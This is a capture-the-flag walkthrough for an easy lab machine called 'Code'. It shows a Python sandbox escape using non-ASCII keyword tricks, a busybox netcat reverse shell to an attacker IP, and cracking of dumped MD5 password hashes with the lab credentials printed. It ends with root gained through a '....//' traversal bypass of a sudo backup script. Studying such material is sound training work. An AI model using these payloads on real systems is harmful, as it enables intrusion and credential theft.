# Code - Easy

```sh
sudo vim /etc/hosts
# add code.htb

nmap -T4 -p- -A -Pn -v code.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.12
    * 5000/tcp - http - Gunicorn 20.0.4

* checking the service on port 5000, we have an online Python code editor

* the website also has links to register at '/register' and login at '/login'

* Wappalyzer shows that the website is using text editor Ace 1.4.12 - we can search if there are any exploits associated with this version but we don't get anything

* we can create a test account and login - now there is a link to '/codes' as well for our saved codes

* we can try executing some Python code in the editor to check if we have RCE:

    ```py
    import os
    os.system('whoami')
    ```

* if we click on Run, we get the error 'Use of restricted keywords is not allowed' in the output tab

* checking the source code of the webpage, we can see the script section include some info:

    * '/save_code' endpoint is used to save the code with a POST call having parameters 'code' and 'name'
    * '/load_code' endpoint is used to set the code with a GET call
    * '/run_code' endpoint is used to run the code with a POST call having 'code' parameter

* this can be confirmed if we use Burp Suite to intercept the requests and check the request formats

* if we save a test code snippet with any name, and load it from the '/codes' endpoint, the 'code_id' parameter is used in the URL query - 'http://code.htb:5000/?code_id=2'

* we can try fuzzing the 'code_id' parameter but that does not lead to anything

* we can attempt [Python sandbox escape and Pyjail techniques](https://github.com/mahaloz/ctf-wiki-en/blob/master/docs/pwn/linux/sandbox/python-sandbox-escape.md) to avoid the restricted keywords error:

    * we can try using built-in functions first:

        * ```dir(__builtins__)``` - restricted
        * ```help(__builtins__)``` - restricted
        * ```__builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))``` - restricted
    
    * this indicates that many keywords are blacklisted

    * we can create objects & references:

        * ```print ().__class__.__bases__[0].__subclasses__()[40](&quot;/etc/services&quot;).read()``` - restricted
    
    * we can define a function and check the function's global scope:

        ```py
        def func(): pass
        print(func.__globals__)
        ```
    
    * this works and we get a lot of output in the output tab - we can copy-paste the contents as the window does not show the complete view

* checking the function's global scope using ```__globals__``` gives us a lot of info:

    * the app name is set to 'app' and its location is ```/home/app-production/app/app.py```

    * the ```__builtins__``` variable discloses all functions - this includes functions like ```eval``` & ```exec```

    * the Flask app code includes a lot of functions & modules - and this includes ```os``` too
    
    * Python 3.8 is used to run the app

* we can use this info to build our code for [Python sandbox evasion using Pyjail escapes](https://shirajuki.js.org/blog/pyjail-cheatsheet/):

    * we know that keywords like 'import', 'os' and 'system' are blacklisted by the code editor

    * however, if we use non-ASCII letters, like '𝘪𝘮𝘱𝘰𝘳𝘵' or '𝘴𝘺𝘴𝘵𝘦𝘮', the code editor does not restrict it - as it is probably looking only for ASCII characters

    * we can use [online text generators](https://lingojam.com/ItalicTextGenerator) to generate the non-ASCII chars

    * if we use a command like ```__𝘪𝘮𝘱𝘰𝘳𝘵__('𝘰𝘴').𝘴𝘺𝘴𝘵𝘦𝘮("id")```, we get the message "No module named '𝘰𝘴'"; this means the module name needs ASCII characters to be detected

    * we can use string concatenation & manipulation to get around this by crafting 'os' as 'o'+'s'

    * so, using the command ```__𝘪𝘮𝘱𝘰𝘳𝘵__('o'+'s').𝘴𝘺𝘴𝘵𝘦𝘮("id")```, we are able to run this, but the output is not shown

    * to check for RCE, we can try with the ```ping``` command - setup a listener using ```sudo tcpdump -i tun0 icmp```

    * now, if we paste the command ```__𝘪𝘮𝘱𝘰𝘳𝘵__('o'+'s').𝘴𝘺𝘴𝘵𝘦𝘮("ping -c 3 10.10.14.62")``` in the editor and run it, we can see ping packets in ```tcpdump``` - this means we have RCE

    * now setup listener with ```nc -nvlp 4444```, and we can use revshell one-liners like ```__𝘪𝘮𝘱𝘰𝘳𝘵__('o'+'s').𝘴𝘺𝘴𝘵𝘦𝘮("busybox nc 10.10.14.62 4444 -e sh")``` to get reverse shell

* in reverse shell:

    ```sh
    id
    # 'app-production'

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    pwd
    # /home/app-production/app/

    cd

    ls -la

    cat user.txt
    # user flag

    cd app

    ls -la
    # check app files

    cat app.py
    # gives cleartext password

    ls -la instance
    # we have 'database.db'
    ```

* the 'app.py' file contains the secret key '7j4D5htxLHUiffsjLXB1z9GaZ5' for the DB connection to 'sqlite:///database.db'; the code shows that passwords are hashed in MD5, and the blacklisted keywords are also listed

* we also have 'database.db' file - we can view it for any hashes:

    ```sh
    which sqlite3
    # available

    cd instance

    sqlite3 database.db .dump
    # gives hashes

    ls -la /home
    # we have another user 'martin'
    ```

* the 'database.db' dump gives us MD5 hashes for users 'development' and 'martin'; checking the home directories we have another user 'martin'

* cracking the MD5 hashes using [Crackstation](https://crackstation.net/) works and we get the creds 'development:development' and 'martin:nafeelswordsmaster'

* we can now try to login as 'martin' via SSH:

    ```sh
    ssh martin@code.htb
    # this works

    ls -la
    # we have a 'backups' folder

    ls -la backups
    # includes a '.tar.bz2' file and a '.json' file

    cat backups/task.json

    sudo -l
    # (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
    ```

* 'martin' home directory has a non-default folder 'backups' with a '.tar.bz2' archive and a JSON file with archive info

* ```sudo -l``` shows that 'martin' can run the script at ```/usr/bin/backy.sh``` as root - we can check this:

    ```sh
    ls -la /usr/bin/backy.sh

    cat /usr/bin/backy.sh
    ```

    ```sh
    #!/bin/bash

    if [[ $# -ne 1 ]]; then
        /usr/bin/echo "Usage: $0 <task.json>"
        exit 1
    fi

    json_file="$1"

    if [[ ! -f "$json_file" ]]; then
        /usr/bin/echo "Error: File '$json_file' not found."
        exit 1
    fi

    allowed_paths=("/var/" "/home/")

    updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

    /usr/bin/echo "$updated_json" > "$json_file"

    directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

    is_allowed_path() {
        local path="$1"
        for allowed_path in "${allowed_paths[@]}"; do
            if [[ "$path" == $allowed_path* ]]; then
                return 0
            fi
        done
        return 1
    }

    for dir in $directories_to_archive; do
        if ! is_allowed_path "$dir"; then
            /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
            exit 1
        fi
    done

    /usr/bin/backy "$json_file"
    ```

    * the script takes an argument as the JSON file, which includes the directories to be backed up

    * the script has a variable for 'allowed_paths', which includes only directories ```/var/``` & ```/home/```

    * JSON sanitization is done, by removing ```../``` from each entry to prevent directory traversal attacks, and it overwrites the original JSON file

    * then, the path-checking is done, where the updated entry is compared with 'allowed_paths'

    * the check is done for each directory in the updated path, and if the dir is out of ```/var/``` or ```/home/```, the script exits

    * if the paths are allowed, the script runs ```/usr/bin/backy``` with the sanitized JSON file

* we can check the binary but it seems to be a non-default binary as GTFObins does not list it:

    ```sh
    ls -la /usr/bin/backy
    ```

* if we try to create a symlink like ```ln -s /root /home/martin/test``` and use it in the JSON file, the script works, but the backup is not taken of ```/root```

* we can experiment with the directory traversal checks done by the script, by testing on our machine, to identify any bypasses

* we can check that the script removes ```../``` from the directory path; so if we repeat the dir like ```....//```, then it is removed only once, which still gives us ```../```

* we can use this double directory traversal trick to break the script logic:

    ```sh
    vim test.json
    # modify the destination as well
    ```

    ```json
    {
    "destination": "/tmp",
    "multiprocessing": true,
    "verbose_log": false,
    "directories_to_archive": [
        "/home/....//root/"
    ]
    }
    ```

    ```sh
    sudo /usr/bin/backy.sh test.json
    
    ls -la /tmp
    # this works

    cd /tmp

    tar -xf code_home_.._root_2026_February.tar.bz2
    # extract all files

    cd root

    cat root.txt
    # root flag
    ```
